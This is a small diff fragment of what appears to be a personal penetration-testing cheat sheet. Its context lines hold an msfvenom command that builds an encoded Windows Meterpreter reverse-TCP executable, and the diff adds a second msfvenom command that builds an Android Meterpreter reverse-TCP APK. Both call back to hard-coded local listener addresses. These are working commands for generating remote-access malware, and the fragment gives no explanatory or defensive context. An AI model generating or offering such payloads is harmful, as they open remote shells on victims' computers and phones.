@@ -41,3 +41,5 @@ use name
 LHOST
 windows
 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' LHOST=192.168.1.152 LPORT=443 -f exe > c.exe
+android
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=5555 R > /root/apk.apk
